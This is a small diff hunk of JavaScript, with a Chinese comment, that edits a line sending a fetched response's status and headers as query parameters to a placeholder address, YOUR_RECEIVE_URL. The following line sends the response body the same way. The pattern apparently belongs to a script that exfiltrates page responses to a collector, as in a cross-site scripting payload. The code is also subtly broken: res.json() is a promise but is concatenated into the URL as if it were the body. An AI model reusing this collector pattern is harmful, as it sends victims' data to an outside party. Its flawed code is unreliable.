@@ -70,7 +70,7 @@
             
             // 2. 转成字符串（用换行分隔，也可以用逗号 "," 分隔）
             //const headersStr = headersArr.join('\n');
-            fetch(YOUR_RECEIVE_URL+'?res='+resp+':'+headersArr);
+            fetch(YOUR_RECEIVE_URL+'?res='+respStatus+':'+headersArr);
             if (res.ok){ 
              
                 fetch(YOUR_RECEIVE_URL+'?json='+res.json());
